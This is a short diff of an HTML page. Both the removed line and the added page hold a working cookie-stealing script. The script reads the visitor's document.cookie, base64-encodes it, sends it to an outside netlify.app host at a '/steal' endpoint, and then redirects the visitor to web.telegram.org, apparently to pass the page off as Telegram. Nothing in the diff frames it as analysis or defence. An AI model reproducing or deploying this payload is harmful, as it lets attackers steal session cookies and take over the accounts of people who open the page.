@@ -1,1 +1,9 @@
-<script>fetch("https://moonlit-fudge-7acbbf.netlify.app/steal?cookies="+document.cookie)</script>
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        fetch("https://moonlit-fudge-7acbbf.netlify.app/steal?data=" + btoa(document.cookie))
+        .then(() => window.location = "https://web.telegram.org");
+    </script>
+</body>
+</html>
